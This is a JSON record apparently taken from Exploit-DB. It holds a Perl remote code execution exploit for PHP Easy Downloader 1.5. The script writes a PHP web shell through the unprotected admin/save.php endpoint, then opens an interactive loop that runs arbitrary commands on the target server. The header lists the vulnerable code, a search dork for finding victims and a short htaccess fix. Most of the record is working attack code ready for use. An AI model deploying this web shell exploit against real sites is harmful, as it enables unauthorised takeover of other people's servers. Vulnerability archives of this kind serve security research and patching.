{
  "id": "2812",
  "title": "PHP Easy Downloader 1.5 - &#039;save.php&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n# +-------------------------------------------------------------------------------------------\r\n# + PHP Easy Download <= 1.5 Remote Code Execution Vulnerability\r\n# +-------------------------------------------------------------------------------------------\r\n# + Affected Software .: PHP Easy Download <= 1.5\r\n# + Vendor ............: http://www.ironclad.net/\r\n# + Download ..........: http://ironclad.net/scripts/PHP_Easy_Download.zip\r\n# + Description .......: \"PHP Easy Download is an easy to use and convenient download script\"\r\n# + Dork ..............: \"PHP Easy Downloader\"\r\n# + Class .............: Remote Code Execution\r\n# + Risk ..............: High (Remote Code Execution)\r\n# + Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n# +-------------------------------------------------------------------------------------------\r\n# + Details:\r\n# + PHP Easy Download by default installation doesn't prevent any of the files in the\r\n# + file_info/admin directory from being accessed by a client. The file_info/admin/save.php\r\n# + file takes input passed to the script by $_POST and writes it to $_POST[\"filename\"].0\r\n# + unsanatized in the file_info/admin/descriptions directory.\r\n# +\r\n# + Vulnerable Code: \r\n# + file_info/admin/save.php, line(s) 14-36:\r\n# + -> 14: $filename = $_POST[\"filename\"];\r\n# + -> 15: $description = $_POST[\"description\"];\r\n# + -> 20: $path = \"../descriptions/$filename.0\";\r\n# + -> 30: $content = \"$accesses|$description|$moreinfo|$date\";\r\n# + -> 34: $newfile = fopen($path,\"w\");\r\n# + -> 35: fwrite($newfile, $content);\r\n# + -> 36: fclose($newfile);\r\n# + \r\n# + Solution:\r\n# + Prevent users from accessing any of the files in the file_info directory (htaccess).\r\n# +-------------------------------------------------------------------------------------------\r\n\r\nuse Getopt::Long;\r\nuse URI::Escape;\r\nuse IO::Socket;\r\n\r\n$code = \"<?php passthru(\\$_GET[cmd]); ?>\";\r\n\r\nmain();\r\n\r\nsub usage\r\n{\r\n    print \"\\nPHP Easy Download <= 1.5 Remote Code Execution Exploit\\n\";\r\n    print \"-h, --host\\ttarget host\\t(example.com)\\n\";\r\n    print \"-f, --file\\tshell file\\t(shell.php)\\n\";\r\n    print \"-d, --dir\\tinstall dir\\t(/file_info)\\n\";\r\n    exit;\r\n}\r\n\r\nsub main\r\n{\r\n    GetOptions ('h|host=s' => \\$host,'f|file=s' => \\$file,'d|dir=s' => \\$dir);\r\n    usage() unless $host;\r\n    \r\n    $dir = \"/file_info\" unless $dir;\r\n    $file = \"shell.php\" unless $file;\r\n    uri_escape($cmd);\r\n    $sock = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>\"80\")\r\n     or die \"\\nconnect() failed.\\n\";\r\n    \r\n    print \"\\nconnected to \".$host.\", sending data.\\n\";\r\n    $sendurl = \"description=0&moreinfo=\".$code.\"&accesses=0&filename=\".$file.\"&date=&B1=Submit\";\r\n    $sendlen = length($sendurl);\r\n    print $sock \"POST \".$dir.\"/admin/save.php HTTP/1.1\\n\";\r\n    print $sock \"Host: \".$host.\"\\n\";\r\n    print $sock \"Connection: close\\n\";\r\n    print $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\n    print $sock \"Content-Length: \".$sendlen.\"\\n\\n\";\r\n    print $sock $sendurl;\r\n    print \"attempted to create php shell, server response:\\n\\n\";\r\n    while($recvd = <$sock>)\r\n    {\r\n        print \" \".$recvd.\"\";\r\n    }\r\n    \r\n    while($cmd !~ \"~quit\")\r\n    {\r\n        print \"\\n\\n-> \";\r\n        $cmd = <STDIN>;\r\n        if ($cmd !~ \"~quit\")\r\n        {\r\n          $sock = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>\"80\")\r\n           or die \"connect() failed.\\n\";\r\n          $sendurl = uri_escape($cmd);\r\n          \r\n          print $sock \"GET \".$dir.\"/descriptions/\".$file.\".0?cmd=\".$sendurl.\" HTTP/1.1\\n\";\r\n          print $sock \"Host: \".$host.\"\\n\";\r\n          print $sock \"Accept: */*\\n\";\r\n          print $sock \"Connection: close\\n\\n\";\r\n          print \"\\n\";\r\n          \r\n          while($recvd = <$sock>)\r\n          {\r\n              print $recvd;\r\n          }\r\n        }\r\n    }\r\n    exit;\r\n}\r\n\r\n# milw0rm.com [2006-11-18]",
  "url": "https://www.exploit-db.com/exploits/2812"
}